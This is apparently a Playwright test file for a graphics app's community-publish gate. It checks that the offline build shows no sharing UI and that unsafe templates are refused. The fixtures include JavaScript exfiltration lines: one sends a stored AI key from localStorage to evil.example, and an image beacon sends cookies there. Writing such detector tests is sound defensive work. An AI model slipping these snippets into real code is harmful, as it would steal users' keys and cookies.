import { test, expect, type Page } from '@playwright/test';
import { bootstrapGraphic, skipOldEditor } from './_create';

// Era 5.5 community sharing. The E2E dev server is pinned OFFLINE (playwright.config webServer.env),
// so this suite proves two things without a backend:
//   1. Offline-invariance — the offline app shows NONE of the community UI (no topbar button, no
//      publish section). This is the non-negotiable pillar.
//   2. The publish gate — a pure, offline transform — passes a real generated template and blocks an
//      unsafe one.
// The authenticated publish / browse / import paths are live-server paths, verified by the maintainer
// against a real Supabase (supabase/README.md checklist), never from a green build.

async function create(page: Page, categoryName: string, variantName: string) {
  await bootstrapGraphic(page, { category: categoryName, name: variantName });
}

test('offline: no community affordances anywhere', async ({ page }) => {
  skipOldEditor();
  await page.goto('/app');
  await create(page, 'Lower thirds', 'Hairline');

  // No Community or Moderate buttons in the topbar.
  await expect(page.getByRole('button', { name: /Community/ })).toHaveCount(0);
  await expect(page.getByRole('button', { name: /Moderate/ })).toHaveCount(0);

  // Home's graphics list (where publishing lives now) grows no publish buttons offline.
  await page.getByTestId('save-graphic').click();
  await page.getByTestId('save-name').fill('Hairline');
  await page.getByTestId('save-confirm').click();
  await page.getByTestId('open-home').click();
  await page.getByTestId('home-nav-graphics').click();
  const row = page.locator('.lib-row', { hasText: 'Hairline' });
  await expect(row).toBeVisible();
  // The publish action lives in the row's ⋯ menu when it exists at all — open it to prove
  // the offline build genuinely grew no publish entry, not merely a closed menu.
  await row.getByTestId('row-menu').click();
  await expect(page.getByTestId('export-graphic')).toBeVisible(); // the menu IS open
  await expect(page.getByTestId('publish-graphic')).toHaveCount(0);
  await expect(page.getByTestId('publish-sheet')).toHaveCount(0);
});

test('the publish gate passes a real template and blocks an unsafe one', async ({ page }) => {
  await page.goto('/app');
  await create(page, 'Lower thirds', 'Hairline');

  const result = await page.evaluate(async () => {
    const { publishGate } = await import('/src/community/gate.ts');
    const { useTemplateStore } = await import('/src/store/templateStore.ts');
    const tpl = useTemplateStore.getState().template;

    const good = publishGate(tpl);

    // Poison a copy: a CDN dependency (must be promoted to a blocking error) + a Blob asset that would
    // silently serialize to "{}" and lose the image.
    const badTpl = {
      ...tpl,
      html: tpl.html + '\n<script src="https://cdn.example.com/x.js"></script>',
      assets: [...tpl.assets, { path: 'images/x.png', data: new Blob([new Uint8Array([1, 2, 3])]) }],
    };
    const bad = publishGate(badTpl);

    return {
      goodOk: good.ok,
      goodErrors: good.errors.map((e) => `${e.rule}: ${e.message}`),
      badOk: bad.ok,
      badRules: bad.errors.map((e) => e.rule),
    };
  });

  // A freshly generated, export-ready lower third must be publishable.
  expect(result.goodOk, `unexpected gate errors: ${result.goodErrors.join(' | ')}`).toBe(true);
  // The poisoned copy is refused, on both counts.
  expect(result.badOk).toBe(false);
  expect(result.badRules).toContain('external-dependency');
  expect(result.badRules).toContain('asset-not-serializable');
});

test('the publish gate blocks JS that talks to the network, reads storage, or leaves its frame', async ({ page }) => {
  // Publishing goes straight to 'approved' (supabase/migrations/0004), so this gate IS the review.
  // It is a screen rather than a sandbox — a determined author can evade a regex — so what these
  // cases pin is that the OBVIOUS routes are refused and that ordinary graphics still pass.
  await page.goto('/app');
  await create(page, 'Tickers', 'News Strip');

  const result = await page.evaluate(async () => {
    const { publishGate } = await import('/src/community/gate.ts');
    const { variantById } = await import('/src/templates/catalog.ts');
    const { chatGraphicBlock } = await import('/src/showchat/chatGraphicBlock.ts');
    const base = variantById('tk01')!.create({});
    const gate = (js: string) => {
      const g = publishGate({ ...base, js });
      return { ok: g.ok, rules: [...new Set(g.errors.map((e) => e.rule))] };
    };

    // An author who forgot to delete their SHOW CHAT block: it points at THEIR show, and shared it
    // would make every importer's graphic poll it. The mistake case matters as much as the attack.
    const chat =
      base.js +
      '\n' +
      chatGraphicBlock({
        ref: 'abc123',
        key: 'anon-key',
        showId: 'show-id',
        mode: 'feed',
        pollSeconds: 5,
        feedField: 'f0',
        authorField: 'f1',
        messageField: 'f2',
      });

    return {
      baseline: gate(base.js),
      chatBlock: gate(chat),
      // Reads the importer's stored AI key out of the app origin and posts it away.
      exfil: gate(base.js + "\nfetch('https://evil.example/c?k=' + parent.localStorage.getItem('spx-gfx-ai'));"),
      // The same theft with no network CALL at all — only the URL scan catches this one.
      imageBeacon: gate(base.js + "\nnew Image().src = 'https://evil.example/p?d=' + document.cookie;"),
      // Must NOT trip: ordinary DOM/geometry code that merely contains the words.
      ordinary: gate(base.js + '\nvar p = el.parentNode.classList; var t = el.getBoundingClientRect().top;'),
    };
  });

  expect(result.baseline.ok, `a stock ticker must stay publishable: ${result.baseline.rules.join(', ')}`).toBe(true);
  expect(result.ordinary.ok, `false positive on parentNode/rect.top: ${result.ordinary.rules.join(', ')}`).toBe(true);

  expect(result.chatBlock.ok).toBe(false);
  expect(result.chatBlock.rules).toContain('unsafe-js-network');

  expect(result.exfil.ok).toBe(false);
  expect(result.exfil.rules).toContain('unsafe-js-network');
  expect(result.exfil.rules).toContain('unsafe-js-data');
  expect(result.exfil.rules).toContain('unsafe-js-frame');

  expect(result.imageBeacon.ok).toBe(false);
  expect(result.imageBeacon.rules).toContain('external-dependency');
});

test('the publish gate passes every catalog variant', async ({ page }) => {
  // The counterweight to the test above: a screen that refuses real graphics is worse than no
  // screen, because the first thing an author does with a false refusal is work around it.
  await page.goto('/app');
  await create(page, 'Lower thirds', 'Hairline');

  const refused = await page.evaluate(async () => {
    const { publishGate } = await import('/src/community/gate.ts');
    const { CATALOG } = await import('/src/templates/catalog.ts');
    const out: string[] = [];
    for (const key of Object.keys(CATALOG)) {
      for (const variant of CATALOG[key as keyof typeof CATALOG]!) {
        const gate = publishGate(variant.create({}));
        if (!gate.ok) out.push(`${variant.id}: ${gate.errors.map((e) => e.rule).join(', ')}`);
      }
    }
    return out;
  });

  expect(refused, 'these catalog variants can no longer be shared').toEqual([]);
});
